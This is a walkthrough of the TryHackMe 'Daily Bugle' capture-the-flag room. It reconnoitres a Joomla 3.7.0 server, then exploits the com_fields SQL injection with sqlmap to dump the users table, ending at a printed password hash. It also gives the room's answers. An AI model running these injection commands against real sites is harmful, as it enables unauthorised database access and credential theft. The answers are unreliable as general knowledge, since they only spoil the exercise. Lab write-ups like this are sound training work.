# Daily Bugle Walkthrough
### Link
- https://tryhackme.com/room/dailybugle
---
### Task 1 - Deploy
**Question**
###### Who robbed the bank?
**Answer**
###### spiderman
---
### Task 2 - Obtain user and root
1. Reco
- NMAP
```shell
nmap -sC -sV [IP] 
Result:
--> Port 22/80/3306 opened
--> Port 3306: MariaDB
```
- Gobuster
```
gobuster dir -u http://[IP]:80 -w [path to wordlist]
Directories found:
/images
/templates
/media
/modules
/bin
/plugins
/includes
/language
/components
/cache
/libraries
/tmp
/layouts
/administrator
```
- Joomscan

We know **Joomla** is installed.
We have an interesting tool : joomscan (https://www.kali.org/tools/joomscan/)

```
joomscan -u [IP]
```
**Question**
###### What is the Joomla version?
**Answer**
###### Joomla 3.7.0

2. Find an exploit

With the Joomla version, we can try to find an exploit
```
searchsploit joomla 3.7.0
Result:
Joomla! 3.7.0 - 'com_fields' SQL Injection         | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Sit | php/webapps/43488.txt
```

So let's now focus on the first one : SQL Injection
Explore the txt file to understand the exploit
```
searchsploit -x php/webapps/42033.txt
```

We have a beautiful sqlmap commandline to help us ^_^

3. SQLMAP 
```
SQLMAP:
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
*Info* : I don't use the option *--level=5* to perform the command to obtain the result more faster.

Now, let's check all tables 
```
sqlmap -u "http://10.10.59.102/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla --tables
```

We found too many tables: 72
Let's focus on __schemas , __session , __users , __user_keys
After few research, only **__users** give us interesting informaiton.
```
sqlmap -u "http://10.10.27.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla -T "#__users" --dump

Result:
+-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
| id  | name       | email               | params  | password                                                     | username |
+-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
| 811 | Super User | jonah@tryhackme.com | <blank> | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    |
+-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
```





